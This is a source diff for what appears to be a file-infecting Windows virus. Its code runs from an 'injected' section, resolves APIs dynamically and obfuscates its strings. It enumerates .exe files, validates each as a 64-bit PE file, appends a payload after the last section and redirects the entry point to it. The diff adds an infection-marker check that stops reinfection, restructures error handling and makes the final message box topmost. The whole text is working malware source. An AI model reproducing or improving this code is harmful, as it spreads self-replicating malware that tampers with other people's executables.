@@ -6,6 +6,7 @@
 EXTERN_C_START
 extern CONST VOID payload();
 extern CONST LONGLONG delta_start;
+extern CONST DWORD signature;
 extern CONST DWORD code_size;
 EXTERN_C_END
 
@@ -21,7 +22,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     DECLARE_OBFUSCATED(errFindFile, "Error finding .exe files");
     // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
     // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
-    DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
+    // DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
 #endif
 
     CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
@@ -74,8 +75,8 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
-    DWORD dwFileSize;
-    PIMAGE_DOS_HEADER pDosHeader;
+    DWORD dwFileSize, dwSignature;
+    PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     DWORD dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint;
@@ -118,19 +119,27 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
             goto close_map;
         }
 
-        pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
+        pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
+        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+            goto error;
+        }
+
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
-        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
-            pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
+        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
             pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
             pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-            MSGBOX_DBG(DEOBF(errNotPE), NULL, MB_OK | MB_ICONERROR);
-            goto unmap;
+            goto error;
         }
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
         dwPayloadPtr = pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
+        dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
+                                 ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
+        if (dwSignature == signature) {
+            goto error;
+        }
+
         dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
         dwNewEntryPoint = pLastSection->VirtualAddress + pLastSection->SizeOfRawData;
 
@@ -146,6 +155,9 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
 
         pFlushViewOfFile(pMapAddress, 0);
+        goto unmap;
+    error:
+        MSGBOX_DBG(sFilePath, NULL, MB_OK | MB_ICONERROR);
     unmap:
         pUnmapViewOfFile(pMapAddress);
     close_map:
@@ -156,5 +168,6 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     pFindClose(hFind);
 
-    pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle), MB_OKCANCEL | MB_ICONINFORMATION);
+    pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
+                 MB_OKCANCEL | MB_ICONINFORMATION | MB_TOPMOST | MB_SETFOREGROUND);
 }
